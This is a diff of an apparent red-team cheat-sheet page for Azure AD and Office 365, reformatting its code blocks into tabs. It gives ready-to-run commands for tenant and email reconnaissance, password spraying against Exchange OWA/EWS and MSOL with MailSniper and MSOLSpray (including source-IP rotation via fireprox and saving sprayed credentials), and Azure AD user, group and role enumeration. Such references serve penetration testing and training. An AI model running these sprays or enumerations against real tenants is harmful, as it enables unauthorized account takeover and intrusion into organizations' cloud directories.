@@ -1,6 +1,8 @@
+import { Tab, Tabs } from 'nextra-theme-docs'
+
 ## Recon
 #### Recon Azure Tenant using [AADInternals](https://github.com/Gerenios/AADInternals)
-```powershell
+```powershell filename="Powershell" 
 # Get tenant name, authentication, brand name (usually same as directory name) and domain name
 Get-AADIntLoginInformation -UserName root@defcorphq.onmicrosoft.com
 
@@ -15,32 +17,39 @@ Invoke-AADIntReconAsOutsider -DomainName defcorphq.onmicrosoft.com
 ```
 
 #### Recon Email IDs using [o365creeper](https://github.com/LMGsec/o365creeper)
-```powershell
+```powershell filename="Powershell"
 # Enumerate Email IDs by making requests to the `GetCredentialType` API
 python.exe o365creeper.py -f emails.txt -o validemails.txt
 ```
 
 #### Recon Azure Services by [microburst](https://github.com/NetSPI/MicroBurst)
-```powershell
+```powershell filename="Powershell"
 # Enumerates subdomains by subdomain guessing
 Invoke-EnumerateAzureSubDomains -Base defcorphq -Verbose
 ```
 
 ## Initial Access
-#### Password Spray using [MSOLSPray](https://github.com/dafthack/MSOLSpray)
-```powershell
-# The tool can use **fireprox** to change source IP
-Invoke-MSOLSpray -UserList validemails.txt -Password 'P@ssw0rd' -Verbose
-```
 
-#### Password Spray against the exchange service using [MailSniper](https://github.com/dafthack/MailSniper)
-```powershell
-Invoke-PasswordSprayEWS -ExchHostname outlook.office365.com -UserList gotham-emails.txt -Password Gotham2020
-```
+### Password Spray against the exchange service 
+<Tabs items={['MailSniper', 'MSOLSpray']}>
+    <Tab>
+    ```powershell filename="Powershell" copy
+    Invoke-PasswordSprayOWA -ExchHostname mail.domain.com -UserList .\userlist.txt -Password P@ssw0rd -Threads 15 -OutFile owa-sprayed-creds.txt
+    Invoke-PasswordSprayEWS -ExchHostname mail.domain.com -UserList .\userlist.txt -Password P@ssw0rd -Threads 15 -OutFile sprayed-ews-creds.txt
+    ```
+    </Tab>
+     <Tab>
+    ```powershell filename="Powershell" copys
+    # The tool can use **fireprox** to change source IP
+    Invoke-MSOLSpray -UserList validemails.txt -Password 'P@ssw0rd' -Verbose  
+    ```
+    </Tab>
+</Tabs>
+
 
 ## Enumeration
 #### User Enumeration
-```powershell
+```powershell filename="Powershell"
 # Enumerate all users
 powershell Get-AzureADUser -All $true
 
@@ -67,7 +76,7 @@ Get-AzureADUser -All $true \|? {$_.OnPremisesSecurityIdentifier -eq $null}
 Get-AzureADUser \| Get-AzureADUserCreatedObject
 ```
 #### Group Enumeration
-```powershell
+```powershell filename="Powershell"
 # List All Groups
 Get-AzureADGroup -All $true
 
@@ -96,7 +105,7 @@ Get-AzureADGroupMember -ObjectId 783a312d-0de2-4490-92e4-539b0e4ee03e
 Get-AzureADUser -SearchString 'test' \| Get-AzureADUserMembership -ObjectId 'test@defcorphq.onmicrosoft.com'
 ```
 #### Role Enumeration
-```powershell
+```powershell filename="Powershell"
 # Get all available role templates
 Get-AzureADDirectoryroleTemplate
 
@@ -107,7 +116,7 @@ Get-AzureADDirectoryRole
 Get-AzureADDirectoryRole -Filter "DisplayName" -eq 'GlobalAdministrator' \| Get-AzureADDirectoryRoleMember
 ```
 #### Device Enumeration
-```powershell
+```powershell filename="Powershell"
 
 ```
 #### Apps Enumeration
